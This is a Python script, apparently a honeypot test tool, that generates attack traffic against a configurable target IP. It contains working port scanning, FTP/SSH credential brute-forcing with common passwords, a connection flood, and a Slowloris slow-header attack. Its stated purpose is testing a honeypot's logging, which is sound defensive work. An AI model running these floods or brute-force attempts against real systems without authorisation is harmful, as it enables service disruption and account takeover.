import socket
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor
import argparse

class HoneypotSimulator:
    """
    A class to simulate different types of connections and attacks against our honeypot.
    This helps in testing the honeypot's logging and response capabilities.
    """

    def __init__(self, target_ip="127.0.0.1", intensity="medium"):
        self.target_ip = target_ip  # IP address of the honeypot (usually localhost)
        self.intensity = intensity  # Intensity level: low, medium, or high

        self.target_ports = [21, 22, 23, 25, 80, 443, 3306, 5432]

        self.attack_patterns = {
            21: ["USER admin\r\n", "PASS admin123\r\n", "LIST\r\n", "STOR malware.exe\r\n"],
            22: ["SSH-2.0-OpenSSH_7.9\r\n", "admin:password123\n", "root:toor\n"],
            80: ["GET / HTTP/1.1\r\nHost: localhost\r\n\r\n", "POST /admin HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n\r\n", "GET /wp-admin HTTP/1.1\r\nHost: localhost\r\n\r\n"]
        }

        self.intensity_settings = {
            "low": {"max_threads": 2, "delay_range": (1, 3)},
            "medium": {"max_threads": 5, "delay_range": (0.5, 1.5)},
            "high": {"max_threads": 10, "delay_range": (0.1, 0.5)}
        }

    def simulate_connection(self, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            print(f"[*] Attempting connection to {self.target_ip}:{port}")
            sock.connect((self.target_ip, port))

            try:
                banner = sock.recv(1024)
                print(f"[+] Received banner from port {port}: {banner.decode('utf-8', 'ignore').strip()}")
            except socket.timeout:
                print("[-] No banner received")

            if port in self.attack_patterns:
                for command in self.attack_patterns[port]:
                    print(f"[*] Sending command to port {port}: {command.strip()}")
                    sock.send(command.encode())
                    try:
                        response = sock.recv(1024)
                        print(f"[+] Received response: {response.decode('utf-8', 'ignore').strip()}")
                    except socket.timeout:
                        print(f"[-] No response received from port {port}")
                    time.sleep(random.uniform(*self.intensity_settings[self.intensity]["delay_range"]))

            sock.close()

        except ConnectionRefusedError:
            print(f"[-] Connection refused on port {port}")
        except socket.timeout:
            print(f"[-] Connection timeout on port {port}")
        except Exception as e:
            print(f"[-] Error connecting to port {port}: {e}")

    def simulate_port_scan(self):
        print(f"\n[*] Starting port scan simulation against {self.target_ip}")
        for port in self.target_ports:
            self.simulate_connection(port)
            time.sleep(random.uniform(0.1, 0.3))

    def simulate_brute_force(self, port):
        common_usernames = ["admin", "root", "user", "test"]
        common_passwords = ["password123", "admin123", "123456", "root"]
        print(f"\n[*] Starting brute force simulation against port {port}")

        for username in common_usernames:
            for password in common_passwords:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.target_ip, port))

                    if port == 21:
                        sock.send(f"USER {username}\r\n".encode())
                        sock.recv(1024)
                        sock.send(f"PASS {password}\r\n".encode())
                    elif port == 22:
                        sock.send(f"{username}:{password}\n".encode())

                    sock.close()
                    time.sleep(random.uniform(0.1, 0.3))
                except Exception as e:
                    print(f"[-] Error in brute force attempt: {e}")

    def simulate_dos_attack(self, port, connection_count=100):
        print(f"\n[*] Starting DoS simulation on port {port} with {connection_count} connections")

        def flood():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_ip, port))

                try:
                    banner = sock.recv(1024)
                    print(f"[+] Banner: {banner.decode('utf-8', 'ignore').strip()}")
                except socket.timeout:
                    print("[-] No banner received during DoS")

                sock.send(b"A" * 1024)

                try:
                    response = sock.recv(1024)
                    if response:
                        print(f"[+] Response: {response.decode('utf-8', 'ignore').strip()}")
                except socket.timeout:
                    print("[-] No response after sending junk")

                sock.close()
            except Exception as e:
                print(f"[-] DoS attack error: {e}")

        threads = []
        for _ in range(connection_count):
            t = threading.Thread(target=flood)
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

    def simulate_slowloris_attack(self, port, connection_count=1):
        print(f"\n[*] Starting Slowloris attack on port {port} with {connection_count} slow connections")

        def slowloris_connection():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((self.target_ip, port))

                try:
                    banner = sock.recv(1024)
                    if banner:
                        print(f"[+] Banner during Slowloris: {banner.decode('utf-8', 'ignore').strip()}")
                except socket.timeout:
                    print("[-] No banner received during Slowloris attack.")

                for _ in range(5):
                    try:
                        sock.send(b"X-a: b\r\n")
                        time.sleep(4)
                    except Exception:
                        break

                sock.close()
            except Exception as e:
                print(f"[-] Slowloris connection error: {e}")

        threads = []
        for _ in range(connection_count):
            t = threading.Thread(target=slowloris_connection)
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

    def run_continuous_simulation(self, duration=300):
        print(f"\n[*] Starting continuous simulation for {duration} seconds")
        print(f"[*] Intensity level: {self.intensity}")

        end_time = time.time() + duration

        with ThreadPoolExecutor(
            max_workers=self.intensity_settings[self.intensity]["max_threads"]
        ) as executor:
            while time.time() < end_time:
                simulation_choices = [
                    #lambda: self.simulate_port_scan(),
                    #lambda: self.simulate_brute_force(21),
                    #lambda: self.simulate_brute_force(22),
                    #lambda: self.simulate_connection(80),
                    #lambda: self.simulate_dos_attack(21, 100),
                    #lambda: self.simulate_dos_attack(22, 100),
                    #lambda: self.simulate_dos_attack(80, 100),
                    #lambda: self.simulate_slowloris_attack(80),
                    lambda: self.simulate_slowloris_attack(443)
                ]
                executor.submit(random.choice(simulation_choices))
                time.sleep(random.uniform(*self.intensity_settings[self.intensity]["delay_range"]))

def main():
    parser = argparse.ArgumentParser(description="Honeypot Attack Simulator")
    parser.add_argument("--target", default="127.0.0.1", help="Target IP address")
    parser.add_argument("--intensity", choices=["low", "medium", "high"], default="medium", help="Simulation intensity level")
    parser.add_argument("--duration", type=int, default=300, help="Simulation duration in seconds")
    args = parser.parse_args()

    simulator = HoneypotSimulator(args.target, args.intensity)

    try:
        simulator.run_continuous_simulation(args.duration)
    except KeyboardInterrupt:
        print("\n[*] Simulation interrupted by user")
    except Exception as e:
        print(f"[-] Simulation error: {e}")
    finally:
        print("\n[*] Simulation complete")

if __name__ == "__main__":
    main()